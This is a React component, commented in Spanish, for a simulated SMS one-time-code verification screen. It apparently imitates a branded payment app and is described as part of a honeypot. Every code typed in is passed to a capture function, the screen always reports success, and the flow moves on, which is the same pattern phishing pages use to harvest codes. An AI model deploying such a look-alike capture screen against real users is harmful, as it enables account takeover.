// Pantalla de VERIFICACIÓN (código por SMS, simulado: no se envía ningún SMS real).
// El "SMS" llega como notificación dentro del teléfono con un código aleatorio.
// ¿Cambiar textos o tiempos? -> edita src/content.js (sección "otp").
// ¿Cambiar el diseño de las casillas? -> edita src/styles.css (busca ".otp-cell" y ".sms-banner").
import { useCallback, useEffect, useRef, useState } from 'react'
import { AnimatePresence, motion } from 'framer-motion'
import { Arrow } from '../components/Icons.jsx'
import SuccessCheck from '../components/SuccessCheck.jsx'
import { otp as t } from '../content.js'
import { fill } from '../lib/format.js'
import { gsap, useGSAP } from '../lib/gsap.js'
import { capturarOTP } from '../lib/honeypot.js'

const LEN = 6
const empty = () => Array(LEN).fill('')

function maskPhone(d) {
  if (d.length < 10) return 'tu número'
  return `${d.slice(0, 2)} •••• ${d.slice(6, 10)}`
}

export default function OtpStep({ phone, onBack, onNext }) {
  const root = useRef(null)
  const refs = useRef([])
  const [code, setCode] = useState(empty)
  const [phase, setPhase] = useState('idle') // idle | verifying | done
  const [error, setError] = useState(false)
  const [secs, setSecs] = useState(t.segundosReenvio)
  const filled = code.every((c) => c !== '')

  // Contador de reenvío
  useEffect(() => {
    if (secs <= 0 || phase !== 'idle') return
    const id = setTimeout(() => setSecs((s) => s - 1), 1000)
    return () => clearTimeout(id)
  }, [secs, phase])

  const sendSms = useCallback(() => {
    setSecs(t.segundosReenvio)
  }, [])

  // Entrada de la pantalla
  useGSAP(() => {
    gsap.timeline()
      .from('.screen-head > *', { y: 18, autoAlpha: 0, duration: 0.6, stagger: 0.07 })
      .from('.otp-cell', { y: 22, autoAlpha: 0, scale: 0.85, duration: 0.55, stagger: 0.05, ease: 'back.out(1.8)', clearProps: 'transform,translate,rotate,scale' }, 0.2)
      .from('.otp-resend, .aplazo-info-card, .cta-bar > *', { y: 18, autoAlpha: 0, duration: 0.5, stagger: 0.07, clearProps: 'transform,translate,rotate,scale,opacity,visibility' }, 0.45)
    const id = setTimeout(() => refs.current[0]?.focus({ preventScroll: true }), 500)
    return () => clearTimeout(id)
  }, { scope: root })

  const pop = (i) => {
    const el = refs.current[i]
    if (el) gsap.fromTo(el, { scale: 0.86 }, { scale: 1, duration: 0.4, ease: 'back.out(3)', clearProps: 'transform,translate,rotate,scale' })
  }

  const setDigit = (i, val) => {
    const d = val.replace(/\D/g, '').slice(-1)
    setError(false)
    setCode((prev) => { const next = [...prev]; next[i] = d; return next })
    if (d) { pop(i); if (i < LEN - 1) refs.current[i + 1]?.focus() }
  }

  const onKey = (i, e) => {
    if (e.key === 'Backspace' && !code[i] && i > 0) refs.current[i - 1]?.focus()
    if (e.key === 'ArrowLeft' && i > 0) refs.current[i - 1]?.focus()
    if (e.key === 'ArrowRight' && i < LEN - 1) refs.current[i + 1]?.focus()
  }

  // Pegar el código completo en cualquier casilla
  const onPaste = (e) => {
    const d = e.clipboardData.getData('text').replace(/\D/g, '').slice(0, LEN)
    if (!d) return
    e.preventDefault()
    typeIn(d)
  }

  // Rellena dígito por dígito (como el autocompletado de iOS/Android)
  const typeIn = (digits) => {
    setError(false)
    setCode(empty())
    digits.split('').forEach((c, i) => {
      setTimeout(() => {
        setCode((prev) => { const next = [...prev]; next[i] = c; return next })
        pop(i)
        refs.current[Math.min(i + 1, LEN - 1)]?.focus({ preventScroll: true })
      }, 70 * i)
    })
  }

  const verify = useCallback(() => {
    // Capturar el código que intentó el intruso (sea correcto o incorrecto)
    capturarOTP(code.join(''))

    setPhase('verifying')
    setTimeout(() => setPhase('done'), 1400)
    setTimeout(() => onNext(), 2700)
  }, [code, onNext])

  // Verifica solo al completar los 6 dígitos
  useEffect(() => {
    if (filled && phase === 'idle') {
      const id = setTimeout(verify, 280)
      return () => clearTimeout(id)
    }
  }, [filled, phase, verify])

  const descripcion = fill(t.descripcion, { telefono: maskPhone(phone) })

  if (phase !== 'idle') {
    return (
      <div className="screen-body">
        <AnimatePresence mode="wait">
          {phase === 'verifying' ? (
            <motion.div key="v" className="verify-wrap" initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0, scale: 0.96 }}>
              <div className="spinner" />
              <div>
                <h3>{t.verificandoTitulo}</h3>
                <p>{t.verificandoSub}</p>
              </div>
            </motion.div>
          ) : (
            <motion.div key="d" className="verify-wrap" initial={{ opacity: 0 }} animate={{ opacity: 1 }}>
              <SuccessCheck size={104} />
              <motion.div initial={{ opacity: 0, y: 10 }} animate={{ opacity: 1, y: 0 }} transition={{ delay: 0.45 }}>
                <h3>{t.exitoTitulo}</h3>
                <p>{t.exitoSub}</p>
              </motion.div>
            </motion.div>
          )}
        </AnimatePresence>
      </div>
    )
  }

  return (
    <>

      <div className="screen-body" ref={root}>
        <div className="progress"><i className="on" /><i className="on" /><i className="on" /><i /></div>

        <header className="screen-head">
          <span className="eyebrow">{t.paso}</span>
          <h2 className="display">{t.titulo}</h2>
          <p className="lead">{descripcion}</p>
        </header>

        <div className="otp-row">
          {code.map((c, i) => (
            <input
              key={i}
              ref={(el) => (refs.current[i] = el)}
              className={`otp-cell ${c ? 'filled' : ''} ${error ? 'err' : ''}`}
              inputMode="numeric"
              autoComplete={i === 0 ? 'one-time-code' : 'off'}
              maxLength={1}
              value={c}
              onChange={(e) => setDigit(i, e.target.value)}
              onKeyDown={(e) => onKey(i, e)}
              onPaste={onPaste}
              onFocus={(e) => e.target.select()}
              aria-label={`Dígito ${i + 1}`}
            />
          ))}
        </div>
        <p className={`otp-error ${error ? 'on' : ''}`} aria-live="assertive">{error ? t.error : ' '}</p>

        <div className="otp-resend">
          {secs > 0 ? (
            <span className="btn-link static">{t.reenviarEn}<b>0:{String(secs).padStart(2, '0')}</b></span>
          ) : (
            <button type="button" className="btn-link" onClick={() => { setCode(empty()); setError(false); sendSms() }}>
              <b>{t.reenviar}</b>
            </button>
          )}
        </div>

        <div className="aplazo-info-card">
          <span className="aic-icon">
            <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
              <circle cx="12" cy="12" r="10" />
              <line x1="12" y1="16" x2="12" y2="12" />
              <line x1="12" y1="8" x2="12.01" y2="8" />
            </svg>
          </span>
          <div className="aic-content">
            <b>{t.seguridadTitulo}</b>
            <p>{t.seguridadSub}</p>
          </div>
        </div>

        <div className="spacer" />
        <div className="cta-bar">
          <button className="btn" disabled={!filled} onClick={verify}>
            {t.botonVerificar} <Arrow />
          </button>
          <button className="btn-link" onClick={onBack}>
            {t.botonCambiar}
          </button>
        </div>
      </div>
    </>
  )
}
